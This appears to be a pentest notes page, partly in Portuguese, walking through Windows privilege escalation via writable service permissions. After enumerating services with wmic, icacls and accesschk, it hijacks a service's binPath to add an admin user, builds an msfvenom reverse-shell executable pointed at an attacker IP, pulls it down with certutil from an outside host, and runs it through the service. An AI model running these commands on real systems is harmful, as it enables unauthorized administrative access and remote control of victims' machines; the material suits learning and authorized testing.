# 1. Services

identify the services that are running

```
wmic service
wmic service get Name,State,PathName | findstr "Running" | findstr "Program" - esse comando vai mostrar apenas os programas instalados pelo usuario e que estao com o processo rodando na maquina

icacls "C:\Program Files\IObit\Advanced SystemCare\ASCService.exe" - esse comando vai mostrar as permissoes para esse determinado servi√ßo

```

<div align="left"><figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure></div>

In this case, icacls informs that the user has full permission (F) for this service.\
Using Sysinternals to check service permissions

{% code overflow="wrap" %}
```
accesschk.exe -wvcu "Users" * - Search for all services on the machine that have write permission
```
{% endcode %}

Search for information about a specific service

```
sc query service
sc query AdvancedSystemCareService13 - Search for information about this service
sc qc AdvancedSystemCareService13 - Show service configuration information
```

Using the service to add a user

```
changing the service path to run commands
sc config AdvancedSystemCareService13 binPath=" net user hack Admin@123 /add"

After changing the service path, you need to restart this service to run the command.

sc stop AdvancedSystemCareService13
sc start AdvancedSystemCareService13
```

We can execute a reverse shell to gain administrative access in the same way

```
#Creating the shell
msfvenom -p windows/shell_reverse_tcp lhost=172.168.0.16 lport=8080 -f exe > shell.exe

After that send to target
```

<div align="left"><figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure></div>

Receiving the shell

```
#Changing the service path again

sc config AdvancedSystemCareService13 binPath=" certutil -urlcache -f http://192.168.0.16/shell.exe shell.exe"
```

\
After changing the binpath, just start the service to receive the file.

<div align="left"><figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure></div>

To run the reverse shell just change the binpath again and call the shell

```
sc config AdvancedSystemCareService13 binPath="shell.exe"
```

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure></div>
